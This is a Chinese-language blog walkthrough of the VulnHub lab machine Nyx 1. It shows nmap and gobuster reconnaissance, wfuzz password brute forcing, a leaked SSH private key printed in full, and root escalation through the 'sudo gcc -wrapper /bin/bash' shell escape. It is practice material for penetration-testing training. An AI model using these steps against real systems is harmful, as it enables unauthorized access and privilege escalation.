---
title: 'Vulnhub 打靶记录:Nyx 1'
published: 2026-09-02
description: 'VulnHub 上的 Nyx 1，难度 Easy。通过目录爆破找到 SSH 私钥文件，使用密钥登入后，利用 gcc 的 SUID 权限直接提权到 root。'
image: './img/Nyx_1/Nyx_1_header.png'
tags: ["VulnHub", "Easy", "Linux", "目录爆破", "SUID提权"]
category: '靶机渗透'
draft: false
lang: ''
---

# 前言

### 靶场介绍

非常简单的一台机器，完全不需要多想，直接顺着结果去做就好。适合用来恢复手感。

### 靶场信息

| 字段     | 值                                          |
| ------ | ------------------------------------------ |
| 靶机名    | Nyx_1                                      |
| 靶机 IP  | 192.168.200.131                            |
| 靶机 URL | https://www.vulnhub.com/entry/nyx-1,535/   |
| 下载（镜像） | https://download.vulnhub.com/nyx/nyxvm.zip |

---
# 1.信息收集

## 1.1.Nmap 信息扫描

### 端口扫描

```bash
nmap -sT -p- --min-rate 10000 192.168.200.131 -oA ports
```

![](./img/Nyx_1/image-20260811152228679.png)
### 详细信息

```bash
nmap -sT -sC -sV -O -p22,80 192.168.200.131 -oA detials
```

![](./img/Nyx_1/image-20260811152357634.png)
### 漏洞扫描

```bash
nmap --script=vuln -p22,80 192.168.200.131 -oA vuln
```

![](./img/Nyx_1/image-20260811172531632.png)
## 1.2.Web 探测

nmap 只扫出 22 和 80，优先看 80 上的 Web 服务。

访问：`http://192.168.200.131/`

![](./img/Nyx_1/image-20260811152931959.png)
源码里有一行注释：

```html
<!-- Dont waste your time looking into source codes/robots.txt etc , focus on real stuff -->
```

让我别去看 robots.txt——我偏要去看一下，结果真的什么都没有，页面不存在。

接着做目录枚举：

```bash
gobuster dir -u http://192.168.200.131 \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,html,txt,bak \
    -t 50
```

![](./img/Nyx_1/image-20260811153817024.png)

---
# 2.权限立足

先去访问 `http://192.168.200.131/key.php`，页面提示需要输入密码：

![](./img/Nyx_1/image-20260811171228897.png)

简单试了几个密码，我觉得对这个表单进行爆破：

```bash
wfuzz -c -t 50 -z file,/usr/share/wordlists/rockyou.txt \
  --hh 0 \
  -d "key=FUZZ" \
  http://192.168.200.131/key.php
```

爆出密码 `admin`，填入页面，返回 `really? lol`。感觉被戏耍了，这应该是一个兔子洞。

![](./img/Nyx_1/image-20260811171412737.png)


回想起 nmap 漏洞扫描时 http-enum 扫出来一个文件，去访问一下：

[http://192.168.200.131/d41d8cd98f00b204e9800998ecf8427e.php](http://192.168.200.131/d41d8cd98f00b204e9800998ecf8427e.php)

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA7T94TmbqiRlc6jGh6UOKyKVux+bYoskAdOybtgCfoh064CTHLTMT
HNnXWI8sT1Ml19svvVGnZZKmDTbS/7uOpgsmvO0pmqirCVo0UvD0YhKXVEwkTtmUvPBPAX
ucGRtefJcCtLWnSc4yMtzbYzSYEultUW5EfqqTwfjh48fxvLk1/kznO7EknxpLMupf6hJz
NbGLLbRwINeIjdC0k6iMdMrZ3n58Cho3kigNKSqcyBpkePE+RvnCBegtxBX/m1pUjPjYKY
zdZ0DROQyU3t7Wu6iX4TW688adHjAgXP7ERN0tL6RoJB9vHxO1GmGt5CLoJBYND1uLoTRe
p7xkIPwwgwAAA8iiu9/dorvf3QAAAAdzc2gtcnNhAAABAQDtP3hOZuqJGVzqMaHpQ4rIpW
7H5tiiyQB07Ju2AJ+iHTrgJMctMxMc2ddYjyxPUyXX2y+9UadlkqYNNtL/u46mCya87Sma
qKsJWjRS8PRiEpdUTCRO2ZS88E8Be5wZG158lwK0tadJzjIy3NtjNJgS6W1RbkR+qpPB+O
Hjx/G8uTX+TOc7sSSfGksy6l/qEnM1sYsttHAg14iN0LSTqIx0ytnefnwKGjeSKA0pKpzI
GmR48T5G+cIF6C3EFf+bWlSM+NgpjN1nQNE5DJTe3ta7qJfhNbrzxp0eMCBc/sRE3S0vpG
gkH28fE7UaYa3kIugkFg0PW4uhNF6nvGQg/DCDAAAAAwEAAQAAAQAaUzieOn07yTyuH+O/
Zmc37GNmew7+wR7z2m1MvLT54BRwWqRfN5OfV+y1Pu3Dv44rbX7WmwDgHG2gebzf84fYlN
QvkoFTT/Pqjb/QlDwJxdZU3D4LIcmHTYL2vyiLAKZzXK5ILv/pCKA5VJhjYaqeLpiauImR
JIxQsbUe+UixkATg7u3c/lkPH4p7POb7JJVbemKO07vzUSK3wzMWSukZs5ZZXKH8L5ypSy
CxPe4AUaO5IuXeKPeq45Q7lUvVKAFdxte438jup4YeyS7lbi2+BggJLt3W4jAlrWxaDhK3
/EICCIT8zLt+baltm/xrfiRM2OxTP2S/6/AQlkbSOaBBAAAAgQDTmKPk3pBpmR0tm5KmSK
6ubJkOfjcVwsLlZcVDHOcFIrgbNkEZPqqEnnRQD7BSBz0I05L1H8VgDR4ZkkgVqKmePhI9
Fs3NVsCasih8UubG2TTsGcvOalU+X6zagDiGWxxLNrQ81NBmCUBWPB/dFG+dUo9T0XigNQ
1lD1s4trUG6QAAAIEA/BlxOWPyLx4UHGO7RrrKEjWKpw2Ma6iRbQOo5HfmrJ+mZvUP+qBs
+Qgj3g+Qgt6y+EH67oxWeX/xTti1xHAc0Qx59181QrBFojp0XWtRumhASFC/TceBuP1fYe
DIZ6gYNXN/Pw7PFKStceO/Qhmee+K1/6XRwEvRSvXKG5a7sQ8AAACBAPDrM5bkjXYD9cq7
xfkT1t16YzqK9BmgFgSyOFQjtqFuLt4JtsQhPfip2QZkSCyPk8cVNx74Wvs4rxYl5pacmf
CR8v83WYMc6h4oBLmcxZsxMpaP8B/N7DZeS76A6idz+Cdj6BTmgMh7xFTXQOgB6Gh9LZmE
KXo/rW1gDQ8R+yFNAAAAC21wYW1waXNAbnl4AQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

这看上去是一个 SSH 的私钥，我觉得连接试一下，起初登入用户名直接使用了 root 去连接提示需要密码，回看那个网页的标题是 `mpampis key`，所以我觉得使用这个用户登入尝试。

```bash
sudo ssh -i id_rsa mpampis@192.168.200.131
```

连接成功，成功登入用户 `mpampis`。

![](./img/Nyx_1/image-20260811163124706.png)

---
# 3.提权

查看 sudo 权限：

```bash
mpampis@nyx:~$ sudo -l
Matching Defaults entries for mpampis on nyx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mpampis may run the following commands on nyx:
    (root) NOPASSWD: /usr/bin/gcc
```

`gcc` 可以无密码以 root 身份执行，直接去 GTFOBins 查对应利用方式：

[https://gtfobins.github.io/gtfobins/gcc/#shell](https://gtfobins.github.io/gtfobins/gcc/#shell)

```bash
sudo gcc -wrapper /bin/bash,-s . -x c /dev/null
```


![](./img/Nyx_1/image-20260811164006418.png)

成功获得 root shell。